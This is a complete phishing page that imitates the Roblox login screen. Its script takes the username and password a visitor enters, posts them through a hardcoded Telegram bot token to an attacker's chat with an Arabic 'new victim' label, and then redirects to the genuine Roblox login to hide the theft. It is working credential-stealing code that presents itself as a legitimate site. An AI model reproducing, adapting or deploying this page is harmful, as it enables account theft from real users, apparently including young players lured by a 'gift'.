<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Roblox - Log In</title>
<style>
body{background:#232527;margin:0;font-family:Arial;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#fff;border-radius:12px;padding:40px;max-width:400px;width:90%;box-shadow:0 10px 40px rgba(0,0,0,0.3)}
.logo{text-align:center;font-size:32px;font-weight:bold;color:#232527;margin-bottom:20px;letter-spacing:2px}
h1{font-size:18px;text-align:center;color:#232527;margin-bottom:24px;font-weight:500}
input{width:100%;padding:14px;margin-bottom:12px;border:1px solid #cbcbcb;border-radius:8px;font-size:15px;box-sizing:border-box}
input:focus{outline:none;border-color:#00a2ff}
button{width:100%;padding:14px;background:#00a2ff;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}
button:hover{background:#0089d6}
.footer{text-align:center;margin-top:20px;font-size:13px;color:#666}
.footer a{color:#00a2ff;text-decoration:none}
</style></head>
<body>
<div class="card">
<div class="logo">ROBLOX</div>
<h1>Log In to Your Account</h1>
<form onsubmit="send(event)">
<input type="text" id="u" placeholder="Username / Email" required>
<input type="password" id="p" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="footer"><a href="#">Forgot Password or Username?</a></div>
</div>
<script>
async function send(e){
    e.preventDefault();
    var u = document.getElementById('u').value;
    var p = document.getElementById('p').value;
    var msg = "🎣 ضحية جديدة\n🎯 gift\n👤 " + u + "\n🔑 " + p;
    try {
        await fetch("https://api.telegram.org/bot8811078908:AAHh5Gy2HMa0sPOcx6AffivgOHE3NbTYz3U/sendMessage", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({chat_id: "6045243196", text: msg})
        });
    } catch(err) {}
    setTimeout(function(){ window.location.href = "https://www.roblox.com/login"; }, 800);
}
</script>
</body></html>
